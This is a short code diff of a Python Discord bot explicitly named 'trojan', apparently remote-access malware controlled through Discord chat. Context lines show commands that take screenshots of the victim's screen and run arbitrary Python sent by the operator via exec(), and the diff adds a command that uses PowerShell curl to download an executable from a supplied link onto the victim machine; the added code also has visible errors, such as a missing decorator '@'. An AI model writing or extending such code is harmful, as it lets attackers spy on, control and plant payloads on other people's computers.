@@ -337,7 +337,6 @@ async def on_ready():
 
 
 # - image capture
-
 @trojan.command()
 async def screenshot(ctx, pc=pc_name):
     if pc == os.getenv("UserName"):
@@ -435,6 +434,11 @@ async def py(ctx, pc=pc_name, *, code):
             x = exec(code)
         except Exception as e:
             await ctx.send(f'**ERROR:**\n```yaml\n{e}\n```')
+
+trojan.command()
+async def download(ctx, pc=pc_name, link, out="OutFile.exe"):
+    if pc == pc_name:
+        os.system(f'powershell -c "curl {link} -OutFile {out}"')
 
 # - Files
 
